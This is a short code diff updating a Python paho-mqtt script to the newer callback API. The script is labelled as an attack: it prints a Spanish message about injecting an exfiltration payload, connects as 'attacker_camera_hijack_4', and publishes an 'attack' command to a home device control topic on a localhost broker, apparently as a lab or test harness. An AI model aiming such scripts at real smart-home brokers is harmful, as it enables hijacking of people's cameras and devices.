@@ -1,5 +1,6 @@
 import json
 import paho.mqtt.client as mqtt
+from paho.mqtt.enums import CallbackAPIVersion
 
 BROKER = "localhost"
 PORT = 1883
@@ -12,7 +13,7 @@ print("[*] Inyectando payload de exfiltración masiva al canal de control MQTT..
 payload = {"action": "attack"}
 
 try:
-    client = mqtt.Client(client_id="attacker_camera_hijack_4")
+    client = mqtt.Client(CallbackAPIVersion.VERSION2, client_id="attacker_camera_hijack_4")
     client.connect(BROKER, PORT, 60)
     client.publish(f"home/control/{DEVICE_ID}", json.dumps(payload))
     client.disconnect()
